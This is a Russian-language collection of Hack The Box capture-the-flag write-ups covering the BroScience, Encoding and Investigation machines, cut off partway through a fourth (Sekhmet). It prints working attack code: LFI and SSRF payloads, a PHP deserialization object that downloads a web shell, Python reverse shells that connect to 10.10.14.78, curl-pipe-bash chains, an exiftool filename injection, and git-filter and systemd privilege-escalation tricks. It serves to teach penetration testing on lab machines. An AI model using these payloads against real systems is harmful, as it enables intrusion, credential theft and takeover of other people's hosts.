можно использовать программы вро де dirsearch, dirb или ﬀuf. Я предпочитаю
feroxbuster.
  При запуске исполь зуем следующие парамет ры:
 • -u — URL;
 • -w — словарь (я использую сло вари из набора Seclists);
 • -t — количество потоков;
 • -d — глу бина сканирования.



Запускаем feroxbuster


feroxbuster -u https://broscience.htb/ -k -w directory_2.3_medium_
lowercase.txt -t 256 -d 2





        Ре зультат ска нирования катало гов с помощью feroxbuster

Находим много катало гов, большинство из которых — второго уровня. Одна-
ко при прос мотре най денных страниц определяем, что каталог /includes/
не проиндексирован, то есть мы можем посмотреть все фай лы, которые
в нем находятся.





                Содержимое каталога /includes/

По поряд ку переби раем фай лы в надежде рас крыть еще какую-нибудь
информацию. В ответ на запрос файла img.php получаем сообщение о том,
что нужно задать параметр path.





                   Сообщение об ошиб ке


LFI
Так как файл img.php при нимает путь к файлу, поищем уяз вимость про-
извольного вклю чения файлов (LFI). Попробуем обойти каталоги и указать
файл /etc/passwd.


https://broscience.htb/includes/img.php?path=../../../../../../../../
etc/passwd





                           Атака обна руже на

И получаем сообщение о том, что нашу атаку обнаружили. Тогда я решил
пробрутить путь по списку с раз ными варианта ми обхода фильтров. Сде лать
это мож но с помощью Burp Intruder.





                    Burp Intruder — вкладка Positions





                       Результат перебора

Выясни ли, что для обхода филь тра достаточно просто дважды закодировать
путь в кодировке URL. Пробуем закоди ровать путь к файлу /etc/passwd
и про читать файл.





                Со держимое файла /etc/passwd

В открытом каталоге мы видели файл db_connect.php, а теперь мы можем
его прочитать.





            Содержимое файла inlcude.db_connect.php

По лучаем учетные данные для подключения к базе дан ных (включая соль
для хеширо вания). Но авто ризоваться с ними не вышло.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




                            ЭКСПЛУАТИРУЕМ LFI
                    И ОШИБКУ СЕРИАЛИЗАЦИИ
                               В КОДЕ НА PHP





ÒÎ×ÊÀ ÎÏÎÐÛ
Áàéïàñ 2FA
Ре гистрируемся на сайте, но сра зу узнаем, что авторизо ваться не выйдет.
Это связано с тем, что на указанную почту будет отправлена ссылка для акти-
вации аккаунта.





             Сообщение о регистрации пользователя

Благода ря LFI про читаем файл register.php и разберем код: воз можно, там
будет зависи мый от каких-либо факторов генератор ссылки.





                   Ис ходный код register.php

В строке 34 выполняется вклю чение файла utils.php, затем в стро-
ке 35 исполь зуется функция generate_activation_code, которая и генери-
рует код. В стро ке 44 сгенерированный код встав ляет ся в ссылку для отправ-
ления поль зователю. Из интересного отметим, что при хешировании пароля
поль зовате ля используется соль из файла для подключения к базе данных
(стро ка 41).
  Продолжаем охоту за генератором кода активации и читаем файл in-
cludes/utils.php.





                 Исходный код includes/utils.php

Код акти вации состоит из 32 случай ных символов (строка 7), но не совсем
слу чай ных. Дело в том, что псевдослучайное значение, которое воз вращает
функция rand, все равно зависимо от сида функции (это значение будет пре-
образовано осо бым алгоритмом в первое случай ное число). То есть если мы
будем знать ини циали затор рандома, то сможем рас считать все «случайные»
символы. В стро ке 4 в качес тве сида используется текущее вре мя на сер-
вере, которое мы можем получить из отве та сервера в Burp History.





                        Ответ сервера

Повторяем алгоритм и вместо функции time() используем полученное зна-
чение времени.


<?php
$chars =
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
srand(strtotime("Tue, 21 Feb 2023 12:22:20 GMT"));
$activation_code = "";
for ($i = 0; $i < 32; $i++) {
   $activation_code = $activation_code . $chars[rand(0, strlen($chars
) - 1)];
}
echo $activation_code;
?>





                       Сгенери рованный код

Ис поль зуем этот код в ссылке для активации соз данно го аккаунта.





                          Активация акка унта

Те перь спокойно авто ризу емся на сайте.


Deserialization RCE
Смотрим запросы в Burp History и обра щаем внимание на уста новленные
куки user-prefs.





                      Зап рос на авто ризацию

В исходном коде страницы находим учас ток кода, где куки формируются
и устанав лива ются. Узнаем, что это сери ализованный и закоди рованный
в Base64 объект.





                     Исходный код utils.php

Затем про исхо дит десери ализация объекта, и он никак не проверяется. Зна-
чит, мы можем использовать десери ализацию для подстановки другого объ-
екта. Также находим класс Avatar, у которо го есть функция записи фай ла.





                     Исходный код utils.php

Таким образом, мы можем соз дать объект класса AvatarInterface, который
получит данные по указанному URL и запишет их в локальный файл PHP.
Сери ализуем его, и это даст нам шелл на сай те.


<?php
class Avatar {
   public $imgPath;


   public function __construct($imgPath) {
       $this->imgPath = $imgPath;
   }


   public function save($tmp) {
       $f = fopen($this->imgPath, "w");
       fwrite($f, file_get_contents($tmp));
       fclose($f);
   }
}


class AvatarInterface {
   public $tmp = "http://10.10.14.78/sh.txt";
   public $imgPath = "./sh.php";


   public function __wakeup() {
       $a = new Avatar($this->imgPath);
       $a->save($this->tmp);
   }
}


echo base64_encode(serialize(new AvatarInterface));
?>




                      Соз дание новых куки

Те перь на сво ем веб-сервере в файл sh.txt записываем самый простой
PHP-шелл.


<?php system($_GET['cmd']); ?>

Встав ляем созданные куки на сайт и отправ ляем зап рос.





                 При менение нового значения куки

На наш веб-сервер придет запрос фай ла sh.txt, а значит, шелл на сай те
создан. Про веряем его: выполним коман ду id.





                 Про верка соз данного PHP-шелла

А теперь мы можем получить реверс-шелл. Обычно я исполь зую код
на Python.


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.
AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.78",4321)); os.
dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
import pty; pty.spawn("sh")'





                  Сессия поль зователя www-data


ÏÐÎÄÂÈÆÅÍÈÅ
На хос те работает и используется сайтом PostgreSQL. С полученными ранее
учетными данными подключаем ся к СУБД и получаем все таблицы из базы
broscience.


psql -h localhost -d broscience -U dbuser
\d t





                     Таб лицы в базе broscience

Есть таб лица users, получа ем из нее все данные.


select * from users;





                     Данные в таблице users

Сохраняем извлеченные из базы хеши вмес те с извес тной нам солью в фор-
мате хеш:соль и отправ ляем на перебор с помощью hashcat.


hashcat -m 20 hash.txt rockyou.txt





                        Взло манные пароли

Так мы узнаем три пароля, и с первым паролем выходит авторизовать ся
по SSH от име ни пользователя bill.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Те перь нам необходимо собрать информа цию. Поскольку вариантов может
быть много, я для этого использую скрип ты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, можно использовать Privilege Escalation Awe-
some Scripts SUITE (PEASS) — набор скрип тов, которые проверя ют систему
на авто мате.


Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание. В выводе будет мно го информа ции. Из интересного —
какой-то скрипт renew_cert.sh в катало ге /opt.





                    Фай лы в каталоге /opt

Скрипт запускается такой коман дой:


/bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt

Это легко опре делить при помощи pspy64. Перейдем к ана лизу самого
скрип та.





                Со держимое файла renew_cert.sh

Скрипт принимает в качестве параметра путь к сер тификату и проверяет срок
его действия. Если он истекает через день, то из сертификата извле каются
все поля и с эти ми значениями генерируется новый. Обратим внимание
на команду, которая перемещает новый сертификат. В нее в качес тве нового
име ни файла прос то вставляет ся содержимое поля Common  Name. Таким
образом, мы можем выполнить инъекцию команды, к при меру присвоить S-
бит файлу командной оболочки /bin/bash.




Когда у файла установлен атрибут setuid (S-атрибут), обычный поль зователь,
запускающий этот файл, получает повышение прав до пользователя — вла-
дельца файла в рам ках запущенного процес са. Пос ле получения повышенных
прав при ложе ние может выполнять задачи, которые недоступны обычному
поль зовате лю. Из-за воз можнос ти сос тояния гонки многие операци онные
системы игнориру ют S-атрибут, уста новленный shell-скриптам.


Ге нери руем новый сертификат и при зап росе Common Name указываем
коман ду $(chmod +s /bin/bash)


openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.
key -out ./Certs/broscience.crt -days 1





                     Генерирование сертификата

Пе риодичес ки проверяем пра ва на файл /bin/bash и замечаем появив ший-
ся S-бит.





                     Права на файл /bin/bash

Те перь можно получить при виле гированный контекст.


/bin/bash -p





                           Флаг рута

Машина захвачена! © X
ВЗЛОМ





          ЭКСПЛУАТИРУЕМ
          GIT-РЕПОЗИТОРИЙ





Сегодня мы с тобой пройдем по цепочке
уязвимос тей:  от  LFI  к эксплуатации  Git,
к другой LFI и под конец — RCE. По дороге
нам  понадобится модернизировать  Git-
дам пер, а при продвижении будем исполь-             RalfHacker                                                                                             hackerralf8@gmail.com
зовать выполнение кода через Git.


Наша цель — зах ватить тренировочную машину Encoding с площад ки Hack
The Box. Уровень сложности — сред ний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.198    encoding.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Мы нашли два откры тых порта: 22 — служ ба OpenSSH 8.9p1 и 80 — веб-сер-
вер Apache 2.4.52. Больше ничего интерес ного в результатах сканирования
нет, поэтому идем изучать веб-сервер.





                  Главная стра ница сайта encoding.htb


ÒÎ×ÊÀ ÂÕÎÄÀ
Бег лый просмотр сай та выводит нас на API, который работает на отдель ном
под домене. Добав ляем новый поддомен в файл /etc/hosts.


10.10.11.198 encoding.htb haxtables.htb api.haxtables.htb





                           Стра ница API

Об рати вни мание, что зап рашиваемая стра ница переда ется в параметре
page. В таких случаях сто ит сразу проверить наличие LFI. Одна ко найти уяз-
вимость не уда лось. Зато на странице есть примеры кода, как работать с API
для кодирования файлов, получаемых по указанному URL.





                    Код для кодирования файла

Немного подправим код, чтобы после получе ния закоди рованного фай ла
обработать ответ и декодировать файл.


import requests
import json
import base64


json_data = {
       'action': 'b64encode',
       'file_url' : 'http://10.10.14.78/test.txt'
}


response = requests.post('http://api.haxtables.htb/v3/tools/string/
index.php', json=json_data)
data = json.loads(response.text.strip())
print(base64.b64decode(data["data"]).decode())

А теперь запросим файл со своего веб-сервера:


python3 -m http.server 80





                      Ло ги веб-сервера





                       Резуль тат зап роса

Код работа ет, файл по ссылке получен. А теперь пробуем изменить про токол
с http:// на file://, что бы попытаться получить локальный файл с сервера.
Читать будем /etc/passwd, для чего изменим в коде параметр file_url.


'file_url' : 'file:///etc/passwd'





                Со держимое файла /etc/passwd

И получаем воз можность читать произвольные фай лы.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




                               ЭКСПЛУАТИРУЕМ
                              GIT-РЕПОЗИТОРИЙ





ÒÎ×ÊÀ ÎÏÎÐÛ
×òåíèå ïðîèçâîëüíûõ ôàéëîâ
Что бы прочитать фай лы сай та, нам нужно знать путь к корневому каталогу.
В этом нам поможет файл конфигурации веб-сер вера.


'file_url' : 'file:///etc/apache2/sites-enabled/000-default.conf'





     Содержимое файла /etc/apache2/sites-enabled/000-default.conf

В ито ге получаем пути к корневым каталогам трех сай тов. Добавляем запись
для под домена image в файл /etc/hosts, несмотря на то что доступ к этому
сайту разрешен только с локального хоста.


10.10.11.198 encoding.htb haxtables.htb api.haxtables.htb image.
haxtables.htb

Первым делом чита ем файл index.php, что бы раскрыть новые подклю-
чаемые файлы.


'file_url' : 'file:///var/www/image/index.php'





               Содержимое фай ла image/index.php

Раскры ваем новый подключаемый файл utils.php. Просмотрим и его.


'file_url' : 'file:///var/www/image/utils.php'





               Содержимое файла image/utils.php

Изучая исходный код, отмечаем для себя, что в каталоге есть репозиторий
Git. Давай найдем спо соб скачать его весь.


Git
Для дам па всего репози тория можно использовать утилиту Dumper . Но так
как мы читаем файлы не нап рямую, а через уяз вимость на сервере, скрипт
нуж но немного модернизировать. Най дем коман ду, где выполняется запрос
с помощью curl.



                  Команда запроса к веб-серверу

Из меним ее для работы через сервис кодирования.


curl 'http://api.haxtables.htb/v3/tools/string/index.php' -s -H
'Content-Type: application/json' --data-binary "{"action": "b64encode
", "file_url": "file:///var/www/image/.git/$objname"}" | jq .data |
tr -d '"' | base64 -d > "$target"

Те перь запускаем скрипт и получа ем весь репозиторий.





                    Резуль тат работы скрипта

Для анализа Git я обыч но использую программу gitk. Запускаем ее из дирек-
тории, где содер жится каталог .git. Мы и так можем читать фай лы на сер-
вере, поэтому меня просто интересо вало, какие файлы и каталоги на нем
есть.





                       Ре пози торий в gitk

Сра зу обращаем внимание на action_handler.php, о котором мы прежде
не знали.


'file_url' : 'file:///var/www/image/actions/action_handler.php'





              Содержимое файла action_handler.php

И видим очень опасное использование функции include. Так в нее переда-
ется принимаемый GET-параметр page. Но мы не можем обратиться к этому
файлу нап рямую, так как доступ к сайту image воз можен только с локального
хоста. Эту LFI мож но раскрутить до RCE, но нам нужна еще уязвимость SSRF,
чтобы обратиться к сай ту image.
  Ничего интересного больше найти не получи лось, поэто му вернемся
к первому сай ту и просканиру ем фай лы PHP с помощью feroxbuster .


feroxbuster -u http://haxtables.htb/ -w php_files_common.txt -d 1





                Резуль тат сканирования файлов PHP

Находим файл handler.php. Сразу получаем его содержимое.


'file_url' : 'file:///var/www/html/handler.php'





                Содержимое файла handler.php

Сервер обрабатывает параметр uri_path и передает его  в функцию
make_api_call. Получим код этой функции из файла utils.php.


'file_url' : 'file:///var/www/api/utils.php'





                Содержимое файла api/utils.php

Эта функция нужна для отправки зап роса на указанный URL. Вот мы и узна ли
спо соб выполнить запрос к action_handler.php, где мы наш ли вызов in-
clude.


PHP include RCE
Первым делом попробу ем проверить, дос тигнем ли мы функции include
на практике. Для этого перепишем код скрип та и зап росим файл /etc/pass-
wd.


import requests
import json


json_data = {
       "action": "",
       "data": "",
       "uri_path": "r@image.haxtables.htb/actions/action_handler.
php?page=/etc/passwd&"
}


response = requests.post('http://haxtables.htb/handler.php', json=
json_data)
print(response.text)





                 Содержимое фай ла /etc/hosts

Фун кцию include мы все-таки достали, поэтому можем сразу получить RCE
php_lter_chain_generator. Сначала генерируем цепочку, которая выполнит
код на PHP:


<?php system('id')?>

Это приведет к выпол нению команды id.


python3 ./php_filter_chain_generator/php_filter_chain_generator.py
--chain "<?php system('id')?>"





                  Генерирование цепочки экспло ита

А теперь выполним новый запрос (цепоч ку необходимо вставить вместо мно-
готочия) и получим результат выполнения команды.


"uri_path": "r@image.haxtables.htb/actions/action_handler.
php?page=...&"





                       Резуль тат зап роса

По местим на сво ем веб-сер вере сле дующий реверс-шелл на Python и запус-
тим листенер pwncat-cs -lp 4321.


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.
AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.78",4321));os.dup2(
s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import
pty; pty.spawn("sh")'

А теперь сгенери руем и отправим цепоч ку, которая скачает и выпол нит
реверс-шелл.


php_filter_chain_generator/php_filter_chain_generator.py --chain "<
?php system('curl http://10.10.14.78/sh.txt|bash');?>"





                  Сессия поль зователя www-data


ÏÐÎÄÂÈÆÅÍÈÅ
Те перь нам необходимо собрать информацию, что бы повысить привиле гии
на хосте. Что бы най ти пути прод вижения, я использую ñêðèïòû PEASS. Заг-
рузив на сервер скрипт для Linux и выпол нив его, я подметил в его выдаче
небезо пасные настройки sudoers.





                       Настройки sudoers




Файл /etc/sudoers в Linux содержит спис ки команд, которые разные группы
поль зовате лей могут выполнять от имени администратора системы. Можно
прос мотреть его как напрямую, так и при помощи команды sudo -l.



Есть возможность выполнить скрипт /var/www/image/scripts/git-commit.
sh от имени поль зователя svc без вво да пароля. Пос мотрим на сам скрипт.





               Содержимое скрипта git-commit.sh

Здесь мы можем применить технику выполнения кода через обработчик
фильтра. Первым делом создадим скрипт, который будет выпол няться.
Скрипт будет копиро вать SSH-ключ пользователя.


echo "cat ~/.ssh/id_rsa > /tmp/key.txt" > /tmp/getkey
chmod +x /tmp/getkey

Заново инициализируем репозиторий и в файл атрибутов Git добавляем
новый фильтр.


git init
echo '*.php filter=indent' > .git/info/attributes

Те перь в качестве обработчика для filter.indent.clean устанавливаем
наш выполняемый скрипт /tmp/getkey.


git config filter.indent.clean /tmp/getkey

И выпол няем git-commit.sh от имени пользовате ля svc.


sudo -u svc /var/www/image/scripts/git-commit.sh





           Применение и выпол нение обработчика фильтра

Те перь пробуем прос мотреть скопирован ный SSH-ключ.





                Содержимое фай ла /tmp/key.txt

Под клю чаемся к хос ту по SSH с полученным клю чом и забира ем пер вый флаг.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Давай снова посмотрим настрой ки sudoers.


sudo -l





                       Настройки sudoers

Те перь мы можем без ввода пароля выполнить от име ни рута такую команду:


/usr/bin/systemctl restart *

Ути лита systemctl нужна для кон троля служб systemd и управления ими,
и для нее есть техника GTFOBins.




GTFOBins — это подборка способов зло употребления функци ями рас-
пространенных программ для Unix. Используя эти рецепты, можно быс тро
получить доступ к командным обо лочкам, повысить привилегии или передать
файлы.





        Опи сание способа эксплуатации GTFOBins для systemctl

Также проверяем права на каталог /etc/systemd/system, где рас положе ны
файлы конфигурации для раз личных служб.





               Содержимое каталога /etc/systemd/

Кто угодно может записывать в каталог /etc/systemd/system, а значит, мы
можем соз дать в нем конфигурацию getroot.service для запус ка коман ды
в при виле гирован ном режиме. В качес тве исполняемой команды назначим
присвоение S-бита файлу командной оболочки /bin/bash.


[Service]
Type =oneshot
ExecStart=chmod u +s /bin /bash
[Install]
WantedBy =multi -user .target

А теперь перезапус тим созданную «служ бу».


sudo /usr/bin/systemctl restart getroot





                 Изменение прав фай ла /bin/bash





                           Флаг рута

У нас есть дос туп от имени рута, а значит, машина захвачена! © X
ВЗЛОМ





         ИЩЕМ СЕКРЕТЫ
      В ЖУРНАЛЕ БЕЗОПАСНОСТИ
             WINDOWS





В этом райтапе я покажу, как эксплуати-
ровать  RCE  в  популярной  программе
exiftool, затем мы получим жур нал безопас-
ности Windows и про анализируем  логи.
При повышении привиле гий разреверсим             RalfHacker                                                                                             hackerralf8@gmail.com
простенький ELF-файл.


Зах ватывать мы будем тренировоч ную машину Investigation с площадки Hack
The Box. Ее уровень сложности — средний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.197    investigation.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

По результатам сканирования имеем всего три открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 80 — веб-сервер Apache 2.4.41;
 • 1234 — веб-сер вер Python 3.8.10.

На SSH идти нет смысла, порт 1234, видимо, был открыт другим игроком, что-
бы скачивать с сервера файлы, поэтому оста ется идти только на веб-сервер
на 80-м пор те. А там, как отра жено в http-title, выпол няется редирект
на http://eforenzics.htb. Добавляем этот домен в /etc/hosts и смотрим
сайт.


10.10.11.197 investigation.htb eforenzics.htb





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ
На сай те находим сервис для анализа изображения и форму для загрузки
ана лизи руемого фай ла.





                     Страница загрузки фай ла

При попытке заг рузить какой-нибудь отличный от изображений формат
получаем ошиб ку, то есть сразу загрузить PHP-шелл не выйдет. Тогда заг-
ружаем кар тинку в PNG и получа ем ссылку на готовый отчет.





                    Резуль тат загрузки файла

Отчет представ ляет собой обычный вывод программы exiftool.





                     Ре зультат ана лиза файла

Однако мы узна ли версию программы — 12.37. Это уже неп лохая зацепка.


ÒÎ×ÊÀ ÎÏÎÐÛ
Первым делом стоит проверить, есть ли для обна руженной версии exiftool
готовые экспло иты. Можно поискать на HackerOne, exploit-db, GitHub  и,
конечно, в Google.





                   По иск экспло итов в Google

В результате я нашел репози торий проекта, откуда узнал, что эта вер сия уяз-
вима перед инъекци ей команды через имя файла. Таким образом, если имя
переданного в exiftool файла заканчивается вер тикальной чертой | и этот
файл при сутствует в фай ловой системе, то сим вол | будет рассматриваться
как пайп и команда, указанная до этого пай па, будет выпол нена в командной
обо лоч ке.
  Переиме нуем наше  изображение,  чтобы  его  новое  имя  состояло
из коман ды для выпол нения и завершающего его пай па.


cp 01.png 'curl 10.10.14.78 | bash |'

Таким образом, если заг рузить «новый» файл, то файл index.html будет зап-
рошен с нашего сервера и выполнится в Bash. На сво ем хосте запустим
прос той веб-сер вер python3 -m http.server 80 и создадим файл index.
htm, который будет содержать реверс-шелл на Python.


python3 -c 'import socket,subprocess,os; s=socket.socket(socket.
AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.78",4321)); os.
dup2(s.fileno(),0);  os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
import pty; pty.spawn("sh")'

Те перь открываем лис тенер:


pwncat-cs -lp 4321

И отправляем файл на анализ. В лис тенере обна ружим новую сес сию.





                  Сессия поль зователя www-data


ÏÐÎÄÂÈÆÅÍÈÅ
Что бы най ти путь для повышения при вилегий на хосте, нам нуж но собрать
информацию о системе. Я, как обычно, использовал скрипт PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, можно использовать Privilege Escalation Awe-
some Scripts SUITE (PEASS) — набор скрип тов, которые проверя ют систему
на авто мате.


Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание. В выводе скрипта есть несколько инте рес ных момен тов.
  В cron видим задачу для сбо ра логов в файл по такому пути:


/usr/local/investigation/analysed_log





                          Задачи cron

Поль зователи груп пы www-data имеют пра во записи вот в этот файл:


/usr/local/investigation/analysed_log





                 Каталоги с разрешением на запись

В файле sudoers есть запись, которая раз решает пользователю smorton
выполнить коман ду /usr/bin/binary от имени пользовате ля root.





                       Настройки sudoers

Об рати внимание на обнаруженный файл и его родительский каталог.





                    Содержимое каталога

В катало ге находим файл .msg — это фор мат Microsoft Outlook Message.
Исполь зуемый нами pwncat-cs позволя ет очень легко скачать этот файл
для ана лиза на своем компьютере.





                      Заг рузка фай ла в pwncat-cs

Файл Microsoft Outlook Message можно прос мотреть с помощью одного
из онлай новых сервисов, нап ример encryptomatic.com. Это намного удобнее,
чем конвертировать письмо в другой формат.





                     Переписка из файла

К письму прикрепле но два файла, один из которых — журнал событий
безопасности Windows.





                Содержимое ска чанного архива

Для прос мотра логов будем использовать утилиту python-evtx.


python3 evtx_dump.py security.evtx





                   Пример события в жур нале

Первым делом смотрим события с иден тификатором 4625 (ошиб ка авториза-
ции). В одном из событий в поле TargetUserName видим какой-то пароль
по умолчанию. Можно предположить, что он был по ошибке вве ден в поле
с име нем поль зователя.


python3 evtx_dump.py security.evtx | grep -A 30 '4625</EventID>'





                 События ошибки авториза ции

У нас есть пароль, пробуем использовать его для входа в сис тему от име ни
раз ных поль зовате лей и служб. Список пользователей берем из файла /etc/
passwd.





                Со держимое файла /etc/passwd

По лучается авторизоваться по SSH как пользователь smorton.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Те перь мы получи ли контекст пользователя smorton и можем вернуться
к исполняемо му фай лу /usr/bin/binary.



                     Информация о файле

Скачиваем его на локаль ный хост:


scp smorton@investigation.htb:/usr/bin/binary binary

И откры ваем в любом удобном декомпиляторе (я использую IDA с Hex Rays).





              Декомпилированный код функции main

Первым делом программа проверя ет количество аргу ментов (стро ка 10), их
должно быть два. Затем происходит про верка кон текста работы (стро-
ка 15) — если запуск был не в привилегированном контексте, программа
завершает свое выполнение. В строке 20 проверяется второй аргу мент, он
должен быть равен указанной стро ке. Если все провер ки прой дены, прог-
рамма выполнит зап рос на ука зан ный в первом аргу менте URL (строки 27–
36) и затем полученные данные передаст как аргумент команде perl (стро-
ки 37–45).
  Соз дадим на своем сер вере файл, содер жащий шелл на Perl, чтобы после
про хож дения всех проверок получить командную оболочку в привилегирован-
ном контек сте.


exec "/bin/bash";

Те перь выполняем прог рамму и получаем сес сию от имени пользователя
root.


sudo /usr/bin/binary http://10.10.14.78/rshell.pl lDnxUysaQn





                           Флаг рута

Машина захвачена! © X
ВЗЛОМ





      ОБХОДИМ MODSECURITY
     И АТАКУЕМ ACTIVE DIRECTORY





В этом райтапе я покажу, как эксплуати-
ровать  уязвимость  при  десериали зации
Node.js с обходом ModSecurity. Затем взло-
маем  ZIP-архив  и  благодаря  Kerberos
повысим при виле гии на первом хосте. Пос-             RalfHacker                                                                                             hackerralf8@gmail.com
ле этого захватим контроллер домена, про-
экс плуатировав RCE.


Все это — в рам ках прохождения трениро вочной машины Sekhmet с площад-
ки Hack The Box. Ее уровень сложности — «безумный».




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Первым делом добавляем IP-адрес машины в /etc/hosts:


10.10.11.179    sekhmet.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Видим два откры тых порта: 22 — служба OpenSSH 8.4p1 и 80 — веб-сервер
Nginx 1.18.0. При обращении к веб-серверу сра зу выполняется редирект
на другой домен.




                             Burp History

Добав ляем его в файл /etc/hosts и снова обра щаемся к сайту.


10.10.11.179 sekhmet.htb windcorp.htb





                  Главная страница сайта windcorp.htb


ÒÎ×ÊÀ ÂÕÎÄÀ
На сай те ничего интересного не находим. Но, учи тывая, что мы нашли реаль-
ное домен ное имя, есть смысл просканиро вать поддомены. Я это делаю
с помощью сканера ffuf.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю лег кий и очень быс трый ﬀuf. При запус ке указываем сле-
дующие парамет ры:
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -r — выполнять редиректы;
 • -fs — фильтровать страницы по размеру;
 • -fc — исключить из результата ответы с кодом 403.

Место перебора помеча ется сло вом FUZZ.


По лучается вот такая команда:


ffuf -u 'http://windcorp.htb/' -H 'Host: FUZZ.windcorp.htb' -w
subdomains-top1million-110000.txt -t 256 -fs 153



          Ре зультат ска нирования поддоменов с помощью ﬀuf

В ито ге находим еще один сайт и добавляем его в файл /etc/hosts.


10.10.11.179 sekhmet.htb windcorp.htb portal.windcorp.htb





              Страница авто ризации на portal.windcorp.htb

Следующее дей ствие при изучении сай та — поиск скры тых каталогов и стра-
ниц. Я снова попробовал использовать ﬀuf, но это не дало резуль татов, так
как, ско рее всего, про веряются заголовки. Чтобы не мучиться с ними, я стал
сканиро вать при помощи Burp Intruder.





           Ре зультат ска ниро вания каталогов в Burp Intruder

И снова ничего инте ресного. У нас осталась толь ко форма авториза ции,
поэтому попробуем ее обой ти. Насколько велико было мое удив ление, когда
получи лось авторизоваться с логином и паролем admin:admin!





            Главная стра ница авто ризо ванного пользователя

Затем мое  вни мание  привлекли  cookie  пользователя. Оказалось,  что
это закоди рованные в Base64 данные в формате JSON. В целом по виду
cookie очень похоже, что используется Node.js. И мы можем утвер ждать, что
на сто роне сервера про исходит десериализация и использование этих дан-
ных.





              Декоди рование cookie в Burp Inspector

Попробуем поискать подходящие уяз вимости. Я без тру да нагуглил статью
Exploiting Node.js deserialization bug for Remote Code Execution, где описано,
